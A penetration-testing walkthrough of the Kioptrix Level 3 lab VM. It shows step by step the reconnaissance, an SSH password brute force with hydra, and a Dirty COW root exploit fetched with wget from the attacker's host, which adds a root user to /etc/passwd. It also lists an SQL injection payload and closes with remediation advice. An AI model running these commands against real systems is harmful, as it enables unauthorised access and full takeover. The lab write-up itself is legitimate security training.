# Kioptrix Level 3 - Professional CTF Walkthrough

**Target:** Kioptrix Level 3 (VM)  
**Platform:** QEMU/Libvirt  
**OS:** Ubuntu 8.04.3 LTS (Kernel 2.6.24-24-server)  
**Difficulty:** Medium  
**Date Completed:** 2026-01-17  

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)  
2. [Service Enumeration](#2-service-enumeration)  
3. [Initial Access - SSH Brute Force](#3-initial-access---ssh-brute-force)  
4. [Local Enumeration](#4-local-enumeration)  
5. [Privilege Escalation - Dirty COW](#5-privilege-escalation---dirty-cow)  
6. [Post-Exploitation](#6-post-exploitation)  
7. [Remediation and Hardening](#7-remediation-and-hardening)  
8. [Appendix: Evidence](#appendix-evidence)  

---

## 1) Reconnaissance

Host discovery was performed on the local subnet with `netdiscover`:

```bash
netdiscover -L -i eth0 -r 192.168.122.0/24
```

**Netdiscover Output:**
```text
IP              MAC Address        Vendor
192.168.122.210 52:54:00:1e:9f:60  Unknown vendor
```

**Target:** 192.168.122.210

---

## 2) Service Enumeration

Full TCP scan with service and OS detection:

```bash
nmap -sS -sV -sC -O -p- -T4 --min-rate 1000 --open 192.168.122.210
```

**Results:**
| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 4.7p1 Debian 8ubuntu1.2 |
| 80   | HTTP    | Apache httpd 2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 |

**Key Findings:**
- Apache 2.2.8 with PHP 5.2.4 exposed a legacy web stack.
- The web app exposed a blog page with a likely username.

---

Directory enumeration was performed with `ffuf`:

```bash
ffuf -u http://192.168.122.210/FUZZ -w /usr/share/wordlists/dirb/big.txt -fc 404 -t 40
```

**Results:**
**ffuf Output (verbatim):**
```text
:: Method           : GET
:: URL              : http://192.168.122.210/FUZZ
:: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
:: Follow redirects : true
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 40
:: Matcher          : Response status: 200,301,302
________________________________________________

cache                   [Status: 200, Size: 1819, Words: 167, Lines: 39, Duration: 0ms]
core                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
favicon.ico             [Status: 200, Size: 23126, Words: 13, Lines: 6, Duration: 0ms]
modules                 [Status: 200, Size: 2186, Words: 139, Lines: 22, Duration: 5ms]
phpmyadmin              [Status: 200, Size: 8136, Words: 1134, Lines: 140, Duration: 75ms]
style                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 0ms]
:: Progress: [20469/20469] :: Job [1/1] :: 56 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

---
---
## 3) Initial Access - SSH Brute Force

Browsing `http://192.168.122.210/index.php?system=Blog` revealed a username in the blog content:

**Discovered user:** `loneferret`

Brute force was performed against SSH:

```bash
hydra -l loneferret -P /usr/share/wordlists/rockyou.txt ssh://192.168.122.210
```

**Valid credentials found:**
- `loneferret:starwars`

SSH access confirmed:

```bash
ssh loneferret@192.168.122.210
```

---

## 4) Local Enumeration

Basic host enumeration:

```bash
id
whoami
hostname -f
uname -a
lsb_release -a 2>/dev/null || cat /etc/*release
```

**Findings:**
- User: `loneferret` (uid=1000)
- OS: Ubuntu 8.04.3 LTS
- Kernel: 2.6.24-24-server

Listening services:

```bash
ss -tulpn 2>/dev/null || netstat -tulpn
```

**Notable:**
- MySQL bound to localhost (127.0.0.1:3306)

Sudo privileges:

```bash
sudo -l
```

```text
(root) NOPASSWD: !/usr/bin/su
(root) NOPASSWD: /usr/local/bin/ht
```

SUID/SGID files (partial):

```bash
find / -perm -4000 -type f -o -perm -2000 -type f 2>/dev/null
```

**Notable:**
- `/usr/local/bin/ht`

---

## 5) Privilege Escalation - Dirty COW

Kernel version was vulnerable to Dirty COW (CVE-2016-5195). The exploit `linux/local/40839.c` was used.

Transfer the exploit to target:

```bash
wget http://192.168.122.209:8000/40839.c
```

Compile:

```bash
gcc -pthread 40839.c -o dirty -lcrypt
```

Run exploit to create a root user in `/etc/passwd`:

```bash
./dirty
```

**Exploit Output (abbreviated):**
```text
/etc/passwd successfully backed up to /tmp/passwd.bak
Complete line:
firefart:fijI1lDcvwk7k:0:0:pwned:/root:/bin/bash
```

**Root access:**
```bash
su firefart
```

**Cleanup (restore /etc/passwd):**
```bash
mv /tmp/passwd.bak /etc/passwd
```

---

## 6) Post-Exploitation

Verify root:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
whoami
# root
```

---

## 7) Remediation and Hardening

| Vulnerability | Severity | Recommendation |
|--------------|----------|----------------|
| Weak SSH password | High | Enforce strong passwords and MFA; lockout on failed attempts |
| Username disclosure via blog | Medium | Remove sensitive info from public content |
| Outdated kernel vulnerable to Dirty COW | Critical | Patch kernel or upgrade OS |
| Legacy web stack (Apache/PHP) | High | Upgrade to supported versions |

**Immediate Actions:**
1. Patch the kernel and reboot.
2. Enforce SSH key-based auth and disable password login.
3. Remove public user references from the web app.

---

## Appendix: Evidence

**Blog username discovery:**
![Blog username](image.png)
The blog page exposed a likely valid username used later for SSH access.

**Other findings:**
![Other finding 1](image-1.png)
Confirmed SQL injection using the payload `' AND 1=1--`.
![Other finding 2](image-2.png)
Evidence of data extracted from the backend database.

---

**Author:** Eligof  
**Date:** 2026-01-17  
**Tools Used:** Nmap, Netdiscover, Hydra, SSH, GCC  
**Methodology:** OSSTMM compliant  
